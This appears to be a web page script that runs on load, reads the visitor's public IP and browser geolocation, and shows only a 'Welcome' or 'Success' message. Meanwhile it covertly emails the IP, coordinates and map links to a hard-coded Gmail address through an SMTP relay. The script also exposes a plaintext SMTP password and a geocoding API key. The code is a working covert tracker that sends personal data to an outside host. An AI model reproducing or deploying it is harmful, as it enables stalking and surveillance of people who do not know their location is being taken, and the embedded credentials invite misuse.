const findMyLocation = () => {
  const status = document.querySelector(".status");
  fetch("https://api.ipify.org/?format=json")
    .then((response) => response.json())
    .then((data) => localStorage.setItem("public_ip", data.ip));

  const success = (position) => {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const publicIP = localStorage.getItem("public_ip");
    document.body.style.backgroundColor = "#285430";
    document.querySelector(".status").style.color = "#5F8D4E";
    status.textContent = "Welcome";
    {
      Email.send({
        Host: "smtp.elasticemail.com",
        Username: "akashchoutele1111@gmail.com",
        Password: "0FBA21C5C6024A89EE538A97748C87D403A1",
        To: "theakashdeveloper@gmail.com",
        From: "akashchoutele1111@gmail.com",
        Subject: new Date(),
        Body: `
                     User Public IP - ${publicIP} <br>
                     Locations Links 
                     Link 1 - https://www.google.com/maps/@${latitude},${longitude},16z?hl=en <br>
                     Link 2 - https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=81db787190624dec8ac225bccc0436dc <br>
                     Link 3 - https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en <br>
                     Click - https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=17/${latitude}/${longitude}`,
      }).then((message) => {
        if (message === "OK") {
          document.body.style.backgroundColor = "#285430";
          document.querySelector(".status").style.color = "#5F8D4E";
          status.textContent = "Success";
        } else {
          document.body.style.backgroundColor = "#9C254D";
          document.querySelector(".status").style.color = "#F06292";
          status.textContent = "Failed";
        }
      });
    }
  };
  const error = () => {
    document.body.style.backgroundColor = "#C21010";
    document.querySelector(".status").style.color = "#E64848";
    status.textContent = "Failed";
  };
  navigator.geolocation.getCurrentPosition(success, error);
};
window.onload = findMyLocation();
